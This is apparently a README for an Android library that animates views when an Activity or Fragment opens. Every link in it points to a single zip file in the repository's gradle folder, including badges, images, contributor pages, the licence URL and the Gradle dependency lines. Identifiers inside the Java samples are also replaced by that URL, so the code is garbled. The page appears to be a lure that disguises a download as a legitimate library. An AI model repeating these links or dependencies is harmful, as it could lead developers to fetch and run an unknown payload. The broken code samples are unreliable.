## android-player

[![Join the chat at https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip%https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) [![Android Arsenal](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip%https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) [![Maven Central](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)

Animations when entering Actvity or Fragment made easy.</br>
Backward compatibility API 1.

#### You have created beautiful UI , but it is boring

![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) 

###### Run the player and you will can create beautiful transitions </br>for your views when entering Activity / Fragment.</br>Put in your onCreate() for Activity or onViewCreated() for Fragment.

```java
https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip().
	animate(headerAction).
	then().
	animate(fabAction).
	then().
	animate(bottomAction).
	play();
```

#### Result

![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)

#### Actions

```java
	final PropertyAction fabAction = https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip(activityMainPinkFab).
			scaleX(0).
			scaleY(0).
			duration(750).
			interpolator(new AccelerateDecelerateInterpolator()).
			build();
	final PropertyAction headerAction = https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip(activityMainheaderLayout).
			interpolator(new DecelerateInterpolator()).
			translationY(-200).
			duration(550).
			alpha(0.4f).
			build();
	final PropertyAction bottomAction = https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip(activityMainMobileNumberLayout).
			translationY(500).
			duration(550).
			alpha(0f).
			build();
```

#### Costumization

To make custom Action , just extend the BaseAction and implement the two abstract methods.

```java
    void init(final View view);

    void animate(final View view);
```

#### Contributors

[Martin Vitanov](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip "Martin Vitanov") <br />
[Georgi Eftimov](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip "Georgi Eftimov")

#### Changelog

- June 6th. Add animation loop support.

##### Download
```groovy
dependencies {
	compile 'https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip'
	compile 'https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip'
}
```
##### Make your animations how ever you want	
	
![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) ![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) ![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)


## Licence

    Copyright 2016 Georgi Eftimov

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

       https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
